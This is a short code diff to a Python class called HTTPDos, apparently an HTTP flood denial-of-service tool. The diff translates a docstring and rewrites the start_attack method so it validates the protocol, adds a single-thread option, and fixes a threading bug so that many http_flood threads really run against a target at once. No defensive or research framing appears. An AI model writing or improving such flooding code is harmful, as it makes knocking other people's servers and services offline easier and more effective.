@@ -85,7 +85,7 @@ class HTTPDos():
         sock.close()
 
     def test_ssl_connection(self):
-        """Fonction pour tester si SSL est disponible sur le serveur"""
+        """Check if SSL is available"""
         try:
             context = ssl.create_default_context()
             sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -182,18 +182,16 @@ class HTTPDos():
         return ''.join(random.choices(string.ascii_lowercase, k=random.randint(4, 10)))
 
     def start_attack(self):
-        """
-        Manage threads and choose attack method
-        """
         try:
-            if self.protocol != False and self.protocol != '':
-                if self.protocol == 'http' or self.protocol == 'https':
-                    for _ in range(self.threads):
-                        thread = Thread(target=self.http_flood())
-                        thread.start()
-            else:
-                print('Bad method')
-                return
-
+            if self.protocol not in ('http', 'https'):
+                raise ValueError(f"Unsupported protocol: {self.protocol}")
+            
+            if self.monothread:
+                return self.http_flood()
+                
+            for _ in range(self.threads):
+                thread = Thread(target=self.http_flood)
+                thread.start()
+                
         except Exception as e:
             color_text('red', f'[!] Error: {e}')
